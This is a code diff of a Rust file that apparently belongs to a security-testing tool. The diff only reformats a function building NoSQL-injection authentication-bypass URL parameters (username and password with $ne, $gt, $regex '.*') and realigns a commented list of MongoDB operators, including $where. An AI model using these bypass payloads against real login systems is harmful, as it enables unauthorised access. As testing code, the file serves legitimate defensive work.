@@ -194,7 +194,11 @@ pub fn url_param_nosql(field: &str, operator: &str, value: &str) -> String {
 pub fn url_params_auth_bypass() -> Vec<String> {
     vec![
         url_param_nosql("username", "ne", ""),
-        format!("{}&{}", url_param_nosql("username", "ne", ""), url_param_nosql("password", "ne", "")),
+        format!(
+            "{}&{}",
+            url_param_nosql("username", "ne", ""),
+            url_param_nosql("password", "ne", "")
+        ),
         url_param_nosql("password", "gt", ""),
         url_param_nosql("password", "regex", ".*"),
     ]
@@ -203,20 +207,20 @@ pub fn url_params_auth_bypass() -> Vec<String> {
 /// Common MongoDB operators for testing
 pub fn mongo_operators() -> Vec<&'static str> {
     vec![
-        "$eq",       // Equal
-        "$ne",       // Not equal
-        "$gt",       // Greater than
-        "$gte",      // Greater than or equal
-        "$lt",       // Less than
-        "$lte",      // Less than or equal
-        "$in",       // In array
-        "$nin",      // Not in array
-        "$regex",    // Regular expression
-        "$exists",   // Field exists
-        "$where",    // JavaScript expression
-        "$or",       // Logical OR
-        "$and",      // Logical AND
-        "$not",      // Logical NOT
+        "$eq",        // Equal
+        "$ne",        // Not equal
+        "$gt",        // Greater than
+        "$gte",       // Greater than or equal
+        "$lt",        // Less than
+        "$lte",       // Less than or equal
+        "$in",        // In array
+        "$nin",       // Not in array
+        "$regex",     // Regular expression
+        "$exists",    // Field exists
+        "$where",     // JavaScript expression
+        "$or",        // Logical OR
+        "$and",       // Logical AND
+        "$not",       // Logical NOT
         "$elemMatch", // Array element match
     ]
 }
